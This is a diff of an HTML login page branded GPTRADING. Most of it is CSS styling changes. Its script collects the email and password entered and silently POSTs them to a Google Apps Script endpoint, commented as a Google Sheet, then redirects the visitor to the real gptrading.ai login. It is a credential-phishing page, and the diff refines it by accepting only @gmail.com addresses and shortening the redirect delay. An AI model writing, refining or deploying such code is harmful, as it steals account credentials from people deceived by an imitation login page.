@@ -8,24 +8,22 @@
   body {
     margin: 0;
     font-family: 'Arial', sans-serif;
-    background: #b6f391; /* verde claro */
+    background: #b6f391; /* Verde claro original */
     display: flex;
     flex-direction: column;
     height: 100vh;
   }
 
-  /* Franja verde fija arriba */
   .verde {
-    height: 5cm; /* altura fija */
-    background: #b6f391;
+    height: 5cm;
+    background: #b6f391; /* Verde claro original */
     width: 100%;
   }
 
-  /* Bloque negro con escalones */
   .negro {
-    flex: 1; /* ocupa lo que sobra */
+    flex: 1;
     width: 100%;
-    background: #000; /* Negro puro */
+    background: #000;
     clip-path: polygon(
       50% 0,
       calc(100% - 32px) 0,
@@ -59,31 +57,30 @@
 
   .green-bg {
     position: absolute;
-    top: -170px; 
-    left: -30%;  
+    top: -170px;
+    left: -30%;
     width: calc(160% - 37.8px);
-    height: 80px; /* Limitado para no invadir debajo de la línea */
-    background-color: #90EE90;
+    height: 80px;
+    background-color: #90EE90; /* Verde principal original */
     z-index: 0;
     border-radius: 8px;
   }
 
-  /* Contenedor de escalones verdes dinámicos (sin línea verde) */
   .green-steps-container {
     position: absolute;
-    top: 0px; 
+    top: 0px;
     left: 50%;
     transform: translateX(-50%);
     height: 32px;
     display: flex;
-    gap: 10px; 
+    gap: 10px;
     z-index: 1;
   }
 
   .green-step {
     width: 20px;
     height: 32px;
-    background-color: #90EE90;
+    background-color: #90EE90; /* Verde principal original */
     clip-path: polygon(
       0 0,
       100% 0,
@@ -98,16 +95,16 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    margin: 100px 0 20px 0; /* Ajustado para alinear con el segundo HTML */
+    margin: 100px 0 20px 0;
     position: relative;
     z-index: 2;
   }
 
   .logo-icon {
-    width: 40px; 
-    height: 26px; 
-    background-color: #000; 
-    border: 4px solid #fff; 
+    width: 40px;
+    height: 26px;
+    background-color: #000;
+    border: 4px solid #fff;
     border-radius: 4px;
     position: relative;
     margin-right: 10px;
@@ -118,9 +115,9 @@
   }
 
   .logo-icon .circle {
-    width: 12px; 
-    height: 12px; 
-    background-color: #fff; 
+    width: 12px;
+    height: 12px;
+    background-color: #fff;
     border-radius: 50%;
   }
 
@@ -133,7 +130,7 @@
     height: 0;
     border-left: 8px solid transparent;
     border-right: 8px solid transparent;
-    border-top: 8px solid #fff; 
+    border-top: 8px solid #fff;
   }
 
   .logo-text {
@@ -143,7 +140,7 @@
   }
 
   .login-title {
-    color: #90EE90;
+    color: #90EE90; /* Verde principal original */
     font-size: 16px;
     text-align: center;
     margin-bottom: 30px;
@@ -153,21 +150,24 @@
     margin-bottom: 20px;
     position: relative;
   }
+
   .form-field label {
     color: #FFFFFF;
     font-size: 14px;
     display: block;
     margin-bottom: 5px;
   }
+
   .form-field label::before {
     content: "* ";
     color: red;
   }
+
   .form-field input {
     width: 100%;
     padding: 10px 40px 10px 10px;
     background-color: #000;
-    border: 2px solid #90EE90;
+    border: 2px solid #90EE90; /* Verde principal original */
     color: #FFFFFF;
     font-size: 14px;
     border-radius: 12px;
@@ -180,11 +180,11 @@
     width: 20px;
     height: 20px;
     cursor: pointer;
-    fill: #90EE90;
+    fill: #90EE90; /* Verde principal original */
   }
 
   .forgot-password {
-    color: #90EE90; 
+    color: #90EE90; /* Verde principal original */
     font-size: 12px;
     text-align: right;
     margin-bottom: 20px;
@@ -194,10 +194,10 @@
   .login-button {
     width: 40%;
     padding: 10px;
-    background-color: #90EE90; 
-    color: #000; 
+    background-color: #90EE90; /* Verde principal original */
+    color: #000;
     font-weight: bold;
-    border: 2px solid #90EE90;
+    border: 2px solid #90EE90; /* Verde principal original */
     cursor: pointer;
     font-size: 14px;
     border-radius: 12px;
@@ -205,37 +205,47 @@
     margin: 0 auto 20px auto;
   }
 
+  .error-message {
+    color: red;
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 20px;
+    display: none;
+  }
+
   .stair {
     position: absolute;
-    top: 110px; /* Ajustado 30px hacia abajo desde 80px */
+    top: 110px;
     right: 20px;
     transform: scale(0.5);
     transform-origin: bottom left;
     z-index: 2;
   }
+
   .step {
     position: absolute;
     width: 12px;
     height: 12px;
-    background-color: #90EE90;
+    background-color: #90EE90; /* Verde principal original */
   }
-  .step:nth-child(1) { top: 1px; left: 0px; }   
+
+  .step:nth-child(1) { top: 1px; left: 0px; }
   .step:nth-child(2) { top: 13px; left: 0px; }
-  .step:nth-child(3) { top: 25px; left: 0px; }  
-  .step:nth-child(4) { top: 25px; left: 12px; } 
-  .step:nth-child(5) { top: 25px; left: 24px; } 
-  .step:nth-child(6) { top: 37px; left: 24px; } 
-  .step:nth-child(7) { top: 49px; left: 24px; } 
-  .step:nth-child(8) { top: 49px; left: 36px; } 
-  .step:nth-child(9) { top: 49px; left: 48px; } 
+  .step:nth-child(3) { top: 25px; left: 0px; }
+  .step:nth-child(4) { top: 25px; left: 12px; }
+  .step:nth-child(5) { top: 25px; left: 24px; }
+  .step:nth-child(6) { top: 37px; left: 24px; }
+  .step:nth-child(7) { top: 49px; left: 24px; }
+  .step:nth-child(8) { top: 49px; left: 36px; }
+  .step:nth-child(9) { top: 49px; left: 48px; }
 
   .extra-square {
     position: absolute;
-    top: 190px; /* Ajustado 30px hacia abajo desde 160px */
+    top: 190px;
     left: -10px;
     width: 16px;
     height: 16px;
-    background-color: #90EE90;
+    background-color: #90EE90; /* Verde principal original */
     z-index: 2;
   }
 
@@ -243,7 +253,7 @@
     position: absolute;
     width: 28px;
     height: 28px;
-    top: calc(100% - 70px + 37.8px); /* Posición original mantenida */
+    top: calc(100% - 70px + 37.8px);
     left: calc(25px + 37.8px);
     transform: scale(0.9);
   }
@@ -252,20 +262,16 @@
     position: absolute;
     width: 10px;
     height: 10px;
-    background-color: #90EE90;
+    background-color: #90EE90; /* Verde principal original */
   }
 </style>
 </head>
 <body>
-
 <div class="verde"></div>
-
 <div class="negro">
   <div class="login-container">
     <div class="green-bg"></div>
-    <!-- Escalones verdes dinámicos centrados -->
     <div class="green-steps-container"></div>
-
     <div class="logo">
       <div class="logo-icon">
         <div class="circle"></div>
@@ -273,26 +279,23 @@
       </div>
       <div class="logo-text">GPTRADING</div>
     </div>
-
     <div class="login-title">Login</div>
-
-    <div class="form-field">
-      <label for="email">E-mail</label>
-      <input type="email" id="email" placeholder="Enter your email" />
-    </div>
-
-    <div class="form-field">
-      <label for="password">Password</label>
-      <input type="password" id="password" placeholder="Enter your password" />
-      <svg class="toggle-eye" viewBox="0 0 24 24" onclick="togglePassword()">
-        <path id="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3 0-5.5-2.46-5.5-5.5S9 6.5 12 6.5s5.5 2.46 5.5 5.5S15 17.5 12 17.5z"/>
-      </svg>
-    </div>
-
-    <div class="forgot-password">I forgot my password</div>
-
-    <button class="login-button">Login</button>
-
+    <form id="login-form">
+      <div class="form-field">
+        <label for="email">E-mail</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email" autocomplete="email" required />
+      </div>
+      <div class="form-field">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required />
+        <svg class="toggle-eye" viewBox="0 0 24 24" onclick="togglePassword()">
+          <path id="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3 0-5.5-2.46-5.5-5.5S9 6.5 12 6.5s5.5 2.46 5.5 5.5S15 17.5 12 17.5z"/>
+        </svg>
+      </div>
+      <div class="error-message" id="error-message">Por favor, revisa tu correo y contraseña</div>
+      <div class="forgot-password">I forgot my password</div>
+      <button type="submit" class="login-button">Login</button>
+    </form>
     <div class="x-container">
       <div class="x-square" style="top: 0; left: 0;"></div>
       <div class="x-square" style="top: 0; left: 18px;"></div>
@@ -300,18 +303,15 @@
       <div class="x-square" style="top: 18px; left: 0;"></div>
       <div class="x-square" style="top: 18px; left: 18px;"></div>
     </div>
-
     <div class="stair">
       <div class="step"></div><div class="step"></div><div class="step"></div>
       <div class="step"></div><div class="step"></div>
       <div class="step"></div><div class="step"></div><div class="step"></div>
       <div class="step"></div>
     </div>
-
     <div class="extra-square"></div>
   </div>
 </div>
-
 <script>
 function togglePassword() {
   const password = document.getElementById('password');
@@ -325,15 +325,22 @@ function togglePassword() {
   }
 }
 
-// Enviar datos a Google Sheet y redirigir
-const formButton = document.querySelector('.login-button');
-formButton.addEventListener('click', function() {
-  const email = document.getElementById('email').value;
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const email = document.getElementById('email').value.toLowerCase();
   const password = document.getElementById('password').value;
+  const errorMessage = document.getElementById('error-message');
+  const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec"; // Tu URL de Apps Script
+  const redirectURL = "https://app.gptrading.ai/auth/login";
 
-  const scriptURL = "https://script.google.com/macros/s/AKfycbyveaEsaqUeshTvIEX8GPZZO_CXugoxl7jtlI7kcLsyOaViTCnXXv9Axq-5FTkghreGHw/exec"; // Reemplaza con tu URL de Apps Script
-  const redirectURL = "https://app.gptrading.ai/auth/login"; // Reemplaza con tu página de destino
+  // Validación inicial: correo debe terminar en @gmail.com y contraseña no vacía
+  const emailRegex = /^[a-z0-9._%+-]+@gmail\.com$/;
+  if (!emailRegex.test(email) || password.length === 0) {
+    errorMessage.style.display = 'block';
+    return; // No enviar datos al Google Sheet ni redirigir
+  }
 
+  // Enviar datos al Google Sheet
   fetch(scriptURL, {
     method: 'POST',
     mode: 'no-cors',
@@ -341,11 +348,12 @@ formButton.addEventListener('click', function() {
     body: JSON.stringify({ email: email, password: password })
   });
 
+  // Ocultar mensaje de error y redirigir
+  errorMessage.style.display = 'none';
   setTimeout(() => {
     window.location.href = redirectURL;
-  }, 2000);
+  }, 1000);
 });
 </script>
-
 </body>
 </html>
